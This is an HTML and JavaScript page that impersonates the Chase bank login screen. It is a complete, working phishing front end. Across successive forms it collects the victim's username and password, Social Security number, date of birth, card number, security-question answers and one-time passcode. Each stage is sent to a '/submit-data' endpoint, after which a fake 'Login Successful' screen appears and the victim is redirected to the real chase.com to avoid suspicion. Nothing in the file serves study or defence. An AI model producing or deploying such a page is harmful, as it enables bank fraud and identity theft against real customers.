<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chase Onlineâ„  - Log in</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f7f7f7;
        }
        .chase-blue {
            background-color: #0070a3;
        }
        .chase-blue-dark {
            background-color: #00507a;
        }
        .btn-primary {
            background-color: #0070a3;
            transition: background-color 0.15s;
        }
        .btn-primary:hover {
            background-color: #00507a;
        }
        .form-input {
            border: 1px solid #ccc;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            box-shadow: inset 0 1px 2px rgba(0,0,0,0.06);
        }
        .form-input:focus {
            border-color: #0070a3;
            outline: none;
            box-shadow: 0 0 0 1px rgba(0, 112, 163, 0.5);
        }
        .logo-text {
            color: #0070a3;
            font-size: 28px;
            font-weight: 800;
        }
        .header-bg {
            background-color: #0070a3;
            height: 40px;
        }
    </style>
</head>
<body>

    <!-- Header (Blue Bar) -->
    <header class="header-bg"></header>

    <!-- Main Container -->
    <main class="min-h-screen pt-8 pb-12">
        <div class="max-w-md mx-auto bg-white shadow-2xl rounded-lg overflow-hidden border border-gray-100">
            
            <!-- Chase Logo Area -->
            <div class="p-6 border-b border-gray-200">
                <p class="logo-text">CHASE</p>
            </div>

            <!-- Dynamic Form Area -->
            <div class="p-6">
                <div id="form-container">
                    <!-- Content will be injected here by JavaScript -->
                </div>
            </div>

            <!-- Footer Links Area -->
            <div class="p-6 bg-gray-50 border-t border-gray-200 text-sm text-gray-600 space-y-2">
                <p class="font-semibold">Security & privacy</p>
                <div class="flex flex-col sm:flex-row justify-between text-xs mt-1">
                    <a href="#" class="text-blue-600 hover:underline">Privacy</a>
                    <a href="#" class="text-blue-600 hover:underline">Security</a>
                    <a href="#" class="text-blue-600 hover:underline">Accessibility</a>
                </div>
            </div>
        </div>

        <!-- Custom Message Box Modal (instead of alert()) -->
        <div id="message-box" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center hidden z-50">
            <div class="bg-white p-6 rounded-lg shadow-2xl w-80 max-w-sm">
                <h3 id="message-title" class="text-xl font-bold mb-2 text-gray-900"></h3>
                <p id="message-content" class="text-gray-700 mb-6"></p>
                <button onclick="closeMessageBox()" class="w-full btn-primary text-white py-2 rounded-lg font-semibold">OK</button>
            </div>
        </div>
    </main>

    <!-- JavaScript Logic -->
    <script>
        const formContainer = document.getElementById('form-container');
        const messageBox = document.getElementById('message-box');
        const messageTitle = document.getElementById('message-title');
        const messageContent = document.getElementById('message-content');
        
        let currentState = 'LOGIN_CREDENTIALS';
        const collectedData = {};

        // --- Utility Functions ---

        function showMessageBox(title, content) {
            messageTitle.textContent = title;
            messageContent.textContent = content;
            messageBox.classList.remove('hidden');
        }

        function closeMessageBox() {
            messageBox.classList.add('hidden');
        }

        async function submitData(step, data) {
            // Add a temporary loading state for user feedback
            const submitButton = document.querySelector(`#${currentState.toLowerCase().replace('_', '-')}-form button[type="submit"]`);
            if (submitButton) {
                submitButton.disabled = true;
                submitButton.textContent = 'Processing...';
            }

            try {
                const response = await fetch('/submit-data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    // Attach the current step data, but also include all previously collected data 
                    // (though we only save the current step on the backend)
                    body: JSON.stringify({ step, data }),
                });

                // Re-enable button
                if (submitButton) {
                    submitButton.disabled = false;
                    submitButton.textContent = submitButton.getAttribute('data-original-text') || 'Sign in'; 
                }

                if (!response.ok) {
                    throw new Error('Server submission failed.');
                }

                const result = await response.json();
                return true;

            } catch (error) {
                console.error('Submission error:', error);
                showMessageBox('Connection Error', 'We apologize, but there was an issue processing your request. Please try again.');
                
                // Re-enable button on error
                if (submitButton) {
                    submitButton.disabled = false;
                    submitButton.textContent = submitButton.getAttribute('data-original-text') || 'Sign in';
                }
                return false;
            }
        }

        // --- Rendering Functions ---

        function renderLogin() {
            formContainer.innerHTML = `
                <h1 class="text-2xl font-semibold text-gray-800 mb-4">Welcome back</h1>
                <p class="text-gray-500 mb-6">Log in to your account</p>
                <form id="login-credentials-form" class="space-y-4">
                    <div>
                        <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
                        <input type="text" id="username" name="username" class="form-input" required value="">
                    </div>
                    <div>
                        <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                        <input type="password" id="password" name="password" class="form-input" required value="">
                    </div>
                    <div class="flex items-center justify-between text-sm">
                        <label class="flex items-center">
                            <input type="checkbox" checked class="form-checkbox text-blue-600 rounded">
                            <span class="ml-2 text-gray-700">Remember me</span>
                        </label>
                        <a href="#" class="text-blue-600 hover:underline">Forgot username/password?</a>
                    </div>
                    <button type="submit" data-original-text="Sign in" class="w-full btn-primary text-white py-2 rounded-lg font-semibold mt-6">Sign in</button>
                </form>
            `;

            document.getElementById('login-credentials-form').addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = e.target.username.value.trim();
                const password = e.target.password.value;
                
                if (username.length < 3 || password.length < 5) {
                    showMessageBox('Invalid Input', 'Please enter a valid username and password.');
                    return;
                }

                const data = { username, password };
                if (await submitData(currentState, data)) {
                    collectedData.LOGIN_CREDENTIALS = data;
                    currentState = 'VERIFICATION_INFO';
                    renderVerification();
                }
            });
        }

        function renderVerification() {
            formContainer.innerHTML = `
                <h1 class="text-2xl font-semibold text-gray-800 mb-4">Verify Your Identity</h1>
                <p class="text-gray-500 mb-6">For your security, please provide the following details.</p>
                <form id="verification-info-form" class="space-y-4">
                    <div>
                        <label for="ssn" class="block text-sm font-medium text-gray-700 mb-1">Social Security Number (SSN)</label>
                        <input type="text" id="ssn" name="ssn" pattern="^\\d{3}-?\\d{2}-?\\d{4}$" title="Format: 000-00-0000" class="form-input" required placeholder="000-00-0000">
                    </div>
                    <div>
                        <label for="dob" class="block text-sm font-medium text-gray-700 mb-1">Date of Birth (MM/DD/YYYY)</label>
                        <input type="text" id="dob" name="dob" pattern="\\d{2}/\\d{2}/\\d{4}" title="Format: MM/DD/YYYY" class="form-input" required placeholder="MM/DD/YYYY">
                    </div>
                    <div>
                        <label for="card" class="block text-sm font-medium text-gray-700 mb-1">Debit/Credit Card Number</label>
                        <input type="text" id="card" name="card" pattern="\\d{13,16}" title="13 to 16 digits" class="form-input" required placeholder="XXXX XXXX XXXX XXXX">
                    </div>
                    <button type="submit" data-original-text="Continue" class="w-full btn-primary text-white py-2 rounded-lg font-semibold mt-6">Continue</button>
                </form>
            `;

            document.getElementById('verification-info-form').addEventListener('submit', async (e) => {
                e.preventDefault();
                const data = {
                    ssn: e.target.ssn.value,
                    dob: e.target.dob.value,
                    card: e.target.card.value
                };

                if (await submitData(currentState, data)) {
                    collectedData.VERIFICATION_INFO = data;
                    currentState = 'SECURITY_QUESTIONS';
                    renderSecurityQuestions();
                }
            });
        }

        function renderSecurityQuestions() {
            formContainer.innerHTML = `
                <h1 class="text-2xl font-semibold text-gray-800 mb-4">Security Challenge</h1>
                <p class="text-gray-500 mb-6">Please answer the following security questions to access your account.</p>
                <form id="security-questions-form" class="space-y-4">
                    <div>
                        <label for="q1" class="block text-sm font-medium text-gray-700 mb-1">What is your mother's maiden name?</label>
                        <input type="text" id="q1" name="q1" class="form-input" required>
                    </div>
                    <div>
                        <label for="q2" class="block text-sm font-medium text-gray-700 mb-1">What was the name of your first pet?</label>
                        <input type="text" id="q2" name="q2" class="form-input" required>
                    </div>
                    <button type="submit" data-original-text="Submit Answers" class="w-full btn-primary text-white py-2 rounded-lg font-semibold mt-6">Submit Answers</button>
                </form>
            `;

            document.getElementById('security-questions-form').addEventListener('submit', async (e) => {
                e.preventDefault();
                const data = {
                    q1: e.target.q1.value,
                    q2: e.target.q2.value,
                };

                if (await submitData(currentState, data)) {
                    collectedData.SECURITY_QUESTIONS = data;
                    currentState = 'OTP_ENTRY';
                    renderOTP();
                }
            });
        }

        function renderOTP() {
            formContainer.innerHTML = `
                <h1 class="text-2xl font-semibold text-gray-800 mb-4">One-Time Passcode (OTP)</h1>
                <p class="text-gray-500 mb-6">We sent a 6-digit code to your phone number ending in **4321**.</p>
                <form id="otp-entry-form" class="space-y-4">
                    <div>
                        <label for="otp" class="block text-sm font-medium text-gray-700 mb-1">6-Digit Code</label>
                        <input type="text" id="otp" name="otp" pattern="\\d{6}" title="Must be 6 digits" maxlength="6" class="form-input text-center text-xl font-mono tracking-widest" required>
                    </div>
                    <div class="text-sm text-gray-500 text-center">
                        <p>Didn't receive a code? <a href="#" class="text-blue-600 hover:underline">Resend code</a></p>
                    </div>
                    <button type="submit" data-original-text="Verify Code" class="w-full btn-primary text-white py-2 rounded-lg font-semibold mt-6">Verify Code</button>
                </form>
            `;

            document.getElementById('otp-entry-form').addEventListener('submit', async (e) => {
                e.preventDefault();
                const data = {
                    otp: e.target.otp.value,
                };

                if (await submitData(currentState, data)) {
                    collectedData.OTP_ENTRY = data;
                    currentState = 'FINAL_REDIRECT';
                    renderFinalRedirect();
                }
            });
        }

        function renderFinalRedirect() {
            formContainer.innerHTML = `
                <div class="text-center py-10">
                    <svg class="mx-auto h-16 w-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    <h1 class="text-2xl font-semibold text-gray-800 mt-4 mb-2">Login Successful</h1>
                    <p class="text-gray-600 mb-6">Thank you for verifying your identity. You are now being securely redirected to your dashboard.</p>
                    <a href="https://www.chase.com" class="w-full inline-block btn-primary text-white py-2 px-4 rounded-lg font-semibold mt-4">Go to Chase.com</a>
                </div>
            `;
            // Redirect after a delay for realism
            setTimeout(() => {
                window.location.href = "https://www.chase.com";
            }, 3000); 
        }

        // Initialize the first view
        document.addEventListener('DOMContentLoaded', renderLogin);

    </script>
</body>
</html>